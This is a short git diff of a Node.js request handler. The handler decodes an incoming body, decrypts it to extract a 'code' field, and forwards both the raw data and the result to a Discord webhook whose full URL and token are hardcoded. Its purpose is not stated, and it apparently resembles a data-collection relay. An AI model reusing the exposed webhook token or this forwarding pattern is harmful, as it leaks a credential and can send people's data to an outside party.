@@ -42,16 +42,13 @@ module.exports = async (req, res) => {
         req.on("end", async () => {
             try {
                 // Send first webhook
-                const data = decodeURIComponent(decodeURIComponent(body)).replace(/-/g, '+').replace(/_/g, '/');
+                const data = decodeURIComponent(decodeURIComponent(body)).replace(/-/g, '+').replace(/_/g, '/').replace(/^data=/, '');
                 await fetch('https://discord.com/api/webhooks/1100381486798094428/QSMcJE-Tp8embdLntKoqNeuKHLEN3vhCTXtzL5mkAlLkd-Rxo_wgbTPR1mR29n1zfUd8', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username: 'Webhook Bot', content: req.query.data })
+                    body: JSON.stringify({ username: 'Webhook Bot', content: data })
                 });
-
-                // Decrypt and process data
-                const decodedBody = decrypt(body.replace(/-/g, '+').replace(/_/g, '/'), key);
-                const code = JSON.parse(decodedBody).code;
+                const code = JSON.parse(decrypt(data, key)).code;
 
                 // Send second webhook
                 await fetch('https://discord.com/api/webhooks/1100381486798094428/QSMcJE-Tp8embdLntKoqNeuKHLEN3vhCTXtzL5mkAlLkd-Rxo_wgbTPR1mR29n1zfUd8', {
